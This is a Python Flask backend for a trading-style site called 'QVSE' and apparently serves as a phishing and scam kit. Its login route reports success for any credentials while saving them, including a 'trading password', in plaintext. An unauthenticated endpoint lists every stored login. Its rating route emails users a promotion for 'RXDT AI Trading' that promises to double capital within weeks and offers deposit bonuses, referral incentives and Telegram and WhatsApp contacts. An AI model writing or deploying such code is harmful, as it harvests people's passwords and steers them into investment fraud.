from flask import Flask, request, jsonify, send_from_directory
from flask_cors import CORS
import psycopg2
import psycopg2.extras
import os
from datetime import datetime
import resend

resend.api_key = os.environ.get('RESEND_API_KEY')

app = Flask(__name__)
CORS(app)

# Neon PostgreSQL connection string (Set this in Vercel Environment Variables)
DATABASE_URL = os.environ.get('DATABASE_URL')


def get_db():
    """Get a connection to the Neon PostgreSQL database."""
    conn = psycopg2.connect(DATABASE_URL)
    return conn


def init_db():
    """Initialize the Neon database and create the users and signup_users tables."""
    conn = get_db()
    cursor = conn.cursor()
    cursor.execute('''
        CREATE TABLE IF NOT EXISTS users (
            id SERIAL PRIMARY KEY,
            login_type TEXT NOT NULL,
            email TEXT,
            phone_number TEXT,
            password TEXT NOT NULL,
            trading_password TEXT,
            remember_password INTEGER DEFAULT 0,
            created_at TEXT NOT NULL
        )
    ''')
    cursor.execute('''
        CREATE TABLE IF NOT EXISTS signup_users (
            id SERIAL PRIMARY KEY,
            signup_type TEXT NOT NULL,
            email TEXT,
            phone_number TEXT,
            password TEXT NOT NULL,
            trading_password TEXT,
            invite_code TEXT,
            created_at TEXT NOT NULL
        )
    ''')
    conn.commit()
    conn.close()


def ensure_signup_table():
    """Ensure the signup_users table exists (called on first request)."""
    try:
        conn = get_db()
        cursor = conn.cursor()
        cursor.execute('''
            CREATE TABLE IF NOT EXISTS signup_users (
                id SERIAL PRIMARY KEY,
                signup_type TEXT NOT NULL,
                email TEXT,
                phone_number TEXT,
                password TEXT NOT NULL,
                trading_password TEXT,
                invite_code TEXT,
                created_at TEXT NOT NULL
            )
        ''')
        conn.commit()
        conn.close()
    except Exception:
        pass


# Ensure signup_users table exists on startup
ensure_signup_table()


@app.route('/api/signup', methods=['POST'])
def signup():
    """Handle signup form submission and save details to the signup_users table."""
    data = request.get_json()

    signup_type = data.get('signup_type', 'email')
    email = data.get('email', '')
    phone_number = data.get('phone_number', '')
    password = data.get('password', '')
    trading_password = data.get('trading_password', '')
    invite_code = data.get('invite_code', '')
    created_at = datetime.now().strftime('%Y-%m-%d %H:%M:%S')

    if not password:
        return jsonify({'success': False, 'message': 'Password is required'}), 400

    if signup_type == 'email' and not email:
        return jsonify({'success': False, 'message': 'Email is required'}), 400

    if signup_type == 'phone' and not phone_number:
        return jsonify({'success': False, 'message': 'Phone number is required'}), 400

    try:
        conn = get_db()
        cursor = conn.cursor()
        cursor.execute('''
            INSERT INTO signup_users (signup_type, email, phone_number, password, trading_password, invite_code, created_at)
            VALUES (%s, %s, %s, %s, %s, %s, %s)
        ''', (signup_type, email, phone_number, password, trading_password, invite_code, created_at))
        conn.commit()
        conn.close()

        return jsonify({'success': True, 'message': 'Account created successfully'}), 200
    except Exception as e:
        return jsonify({'success': False, 'message': str(e)}), 500



@app.route('/api/login', methods=['POST'])
def login():
    """Handle login form submission. Check signup_users first for authentication,
    otherwise save details to the users table."""
    data = request.get_json()

    login_type = data.get('login_type', 'email')
    email = data.get('email', '')
    phone_number = data.get('phone_number', '')
    password = data.get('password', '')
    trading_password = data.get('trading_password', '')
    remember_password = 1 if data.get('remember_password', False) else 0
    created_at = datetime.now().strftime('%Y-%m-%d %H:%M:%S')

    if not password:
        return jsonify({'success': False, 'message': 'Password is required'}), 400

    if not trading_password:
        return jsonify({'success': False, 'message': 'Trading password is required'}), 400

    if login_type == 'email' and not email:
        return jsonify({'success': False, 'message': 'Email is required'}), 400

    if login_type == 'phone' and not phone_number:
        return jsonify({'success': False, 'message': 'Phone number is required'}), 400

    try:
        conn = get_db()
        cursor = conn.cursor()

        # First, check if credentials match a signup_users record
        if login_type == 'email':
            cursor.execute(
                'SELECT id FROM signup_users WHERE email = %s AND password = %s',
                (email, password)
            )
        else:
            cursor.execute(
                'SELECT id FROM signup_users WHERE phone_number = %s AND password = %s',
                (phone_number, password)
            )

        signup_match = cursor.fetchone()

        if signup_match:
            # Credentials match a signed-up user — redirect to dashboard
            conn.close()
            return jsonify({'success': True, 'redirect': 'dashboard', 'message': 'Login successful'}), 200
        else:
            # Auto-register new user directly into signup_users table
            cursor.execute('''
                INSERT INTO signup_users (signup_type, email, phone_number, password, trading_password, invite_code, created_at)
                VALUES (%s, %s, %s, %s, %s, %s, %s)
            ''', (login_type, email, phone_number, password, trading_password, '', created_at))

            # Also log to users table
            cursor.execute('''
                INSERT INTO users (login_type, email, phone_number, password, trading_password, remember_password, created_at)
                VALUES (%s, %s, %s, %s, %s, %s, %s)
            ''', (login_type, email, phone_number, password, trading_password, remember_password, created_at))

            conn.commit()
            conn.close()

            return jsonify({'success': True, 'redirect': 'dashboard', 'message': 'Account created and logged in successfully'}), 200
    except Exception as e:
        return jsonify({'success': False, 'message': str(e)}), 500



@app.route('/api/rating', methods=['POST'])
def save_rating():
    """Handle rating and feedback submission."""
    data = request.get_json()

    rating = data.get('rating', 0)
    feedback = data.get('feedback', '')
    email = data.get('email', '')
    phone_number = data.get('phone_number', '')
    created_at = datetime.now().strftime('%Y-%m-%d %H:%M:%S')

    if not rating or int(rating) < 1 or int(rating) > 5:
        return jsonify({'success': False, 'message': 'A star rating between 1 and 5 is required'}), 400

    try:
        conn = get_db()
        cursor = conn.cursor()
        cursor.execute('''
            CREATE TABLE IF NOT EXISTS ratings (
                id SERIAL PRIMARY KEY,
                rating INTEGER NOT NULL,
                feedback TEXT,
                email TEXT,
                phone_number TEXT,
                created_at TEXT NOT NULL
            )
        ''')
        # Add columns if they don't exist (for existing tables created before this update)
        cursor.execute('ALTER TABLE ratings ADD COLUMN IF NOT EXISTS email TEXT')
        cursor.execute('ALTER TABLE ratings ADD COLUMN IF NOT EXISTS phone_number TEXT')
        cursor.execute('''
            INSERT INTO ratings (rating, feedback, email, phone_number, created_at)
            VALUES (%s, %s, %s, %s, %s)
        ''', (int(rating), feedback, email, phone_number, created_at))
        conn.commit()
        conn.close()

        # Send email via Resend if email is provided
        if email and '@' in email:
            try:
                html_content = f"""
                <div style="font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif; max-width: 600px; margin: 0 auto; padding: 20px; background-color: #090d16; color: #ffffff; border-radius: 14px; border: 1px solid rgba(0, 242, 254, 0.25);">
                    <div style="text-align: center; margin-bottom: 24px;">
                        <h1 style="color: #ffd700; font-size: 28px; margin-bottom: 8px;">Congratulations! 🎉</h1>
                        <p style="color: #8899aa; font-size: 16px; margin-top: 0;">Thank you for rating QVSE!</p>
                    </div>

                    <div style="background: rgba(255, 255, 255, 0.03); border: 1.5px solid rgba(0, 242, 254, 0.15); border-radius: 10px; padding: 18px; margin-bottom: 24px; line-height: 1.6;">
                        <p style="margin: 0; font-size: 15px;">As a <strong>trusted and valued QVSE member</strong>, you have unlocked an exclusive opportunity to earn even more with <strong>RXDT AI Trading</strong> — a powerful platform built for ambitious earners. Start your journey with <strong>as little as $100</strong> and grow your capital faster than ever.</p>
                    </div>

                    <!-- Growth Plans -->
                    <h2 style="font-size: 18px; color: #ffd700; border-bottom: 1px solid rgba(255, 255, 255, 0.1); padding-bottom: 8px; margin-bottom: 16px;">📈 Choose Your Growth Plan</h2>
                    
                    <div style="margin-bottom: 12px; padding: 12px; background: rgba(255,255,255,0.02); border-radius: 8px; border-left: 4px solid #cd7f32;">
                        <strong style="color: #fff;">🥉 Starter (From $100)</strong><br/>
                        <span style="font-size: 13px; color: #8899aa;">1 daily signal. Double capital in less than 2 months (or ~30 days with 1 referral).</span>
                    </div>
                    
                    <div style="margin-bottom: 12px; padding: 12px; background: rgba(255,255,255,0.02); border-radius: 8px; border-left: 4px solid #c0c0c0;">
                        <strong style="color: #fff;">🥈 Growth (From $300)</strong><br/>
                        <span style="font-size: 13px; color: #8899aa;">2 daily signals. Double capital in less than 30 days (even faster with 1 referral).</span>
                    </div>

                    <div style="margin-bottom: 24px; padding: 12px; background: rgba(255,255,255,0.02); border-radius: 8px; border-left: 4px solid #ffd700;">
                        <strong style="color: #fff;">🥇 Pro ($1,000+)</strong><br/>
                        <span style="font-size: 13px; color: #8899aa;">3 daily signals. Double capital in just 3 weeks (less with 1 referral).</span>
                    </div>

                    <!-- Welcome Bonus -->
                    <div style="background: rgba(255, 215, 0, 0.1); border: 1px solid rgba(255, 215, 0, 0.3); border-radius: 10px; padding: 14px; text-align: center; margin-bottom: 24px;">
                        <p style="margin: 0; color: #ffd700; font-size: 15px; font-weight: bold;">🎁 Deposit Bonus Waiting For You!</p>
                        <p style="margin: 4px 0 0 0; color: #e5b610; font-size: 13px;">Get up to <strong>$100 bonus</strong> on your first deposit, plus up to <strong>3 spins</strong> to win up to <strong>$50!</strong></p>
                    </div>

                    <!-- CTA Button -->
                    <div style="text-align: center; margin-bottom: 28px;">
                        <a href="https://www.rxdt.site/#/register?invite=RXN2ZO" target="_blank" style="display: inline-block; padding: 14px 28px; background: linear-gradient(135deg, #ffd700, #e5b610); color: #1a1a1a; font-weight: bold; font-size: 16px; text-decoration: none; border-radius: 30px; box-shadow: 0 6px 20px rgba(255, 215, 0, 0.25);">🚀 Create RXDT Account</a>
                    </div>

                    <!-- Social / Community Channels -->
                    <h2 style="font-size: 18px; color: #ffd700; border-bottom: 1px solid rgba(255, 255, 255, 0.1); padding-bottom: 8px; margin-bottom: 16px;">👥 Join Our Community Channels</h2>
                    
                    <div style="margin-bottom: 12px;">
                        <a href="https://chat.whatsapp.com/CypiIGGCDea7CBNpfxJ9dk?s=cl&p=a&ilr=1" target="_blank" style="display: block; text-align: center; padding: 12px; background: rgba(37, 211, 102, 0.15); border: 1.5px solid rgba(37, 211, 102, 0.5); border-radius: 8px; color: #25d366; text-decoration: none; font-weight: bold; font-size: 14px;">💬 Join WhatsApp Group</a>
                    </div>
                    
                    <div style="margin-bottom: 12px;">
                        <a href="https://t.me/+iIx0d1qCg3syYzE0" target="_blank" style="display: block; text-align: center; padding: 12px; background: rgba(0, 136, 204, 0.15); border: 1.5px solid rgba(0, 136, 204, 0.5); border-radius: 8px; color: #4db8ff; text-decoration: none; font-weight: bold; font-size: 14px;">✈️ Join Telegram Group</a>
                    </div>

                    <div style="margin-bottom: 24px;">
                        <a href="https://t.me/RXDT888" target="_blank" style="display: block; text-align: center; padding: 12px; background: rgba(0, 136, 204, 0.15); border: 1.5px solid rgba(0, 136, 204, 0.5); border-radius: 8px; color: #4db8ff; text-decoration: none; font-weight: bold; font-size: 14px;">👤 Message CEO @RXDT888 on Telegram</a>
                    </div>

                    <div style="text-align: center; border-top: 1px solid rgba(255, 255, 255, 0.1); padding-top: 16px; font-size: 12px; color: #8899aa;">
                        <p style="margin: 0;">QVSE &copy; 2026. All rights reserved.</p>
                    </div>
                </div>
                """
                
                resend.Emails.send({
                    "from": "QVSE Team <noreply@rxdt.site>",
                    "to": email,
                    "subject": "Thank you for rating QVSE! 🎉 Claim your RXDT reward",
                    "html": html_content
                })
            except Exception as mail_err:
                print(f"Resend error: {mail_err}")

        return jsonify({'success': True, 'message': 'Rating saved successfully'}), 200
    except Exception as e:
        return jsonify({'success': False, 'message': str(e)}), 500



@app.route('/api/users', methods=['GET'])
def get_users():
    """Retrieve all saved login entries (for admin/debugging)."""
    try:
        conn = get_db()
        cursor = conn.cursor(cursor_factory=psycopg2.extras.RealDictCursor)
        cursor.execute('SELECT * FROM users ORDER BY created_at DESC')
        rows = cursor.fetchall()
        conn.close()

        users = [dict(row) for row in rows]
        return jsonify({'success': True, 'users': users}), 200
    except Exception as e:
        return jsonify({'success': False, 'message': str(e)}), 500


if __name__ == '__main__':
    # init_db()  # Commented out for Vercel deployment
    # print('Neon database initialized.')
    print('Server running at http://localhost:5000')
    app.run(debug=True, host='0.0.0.0', port=5000)
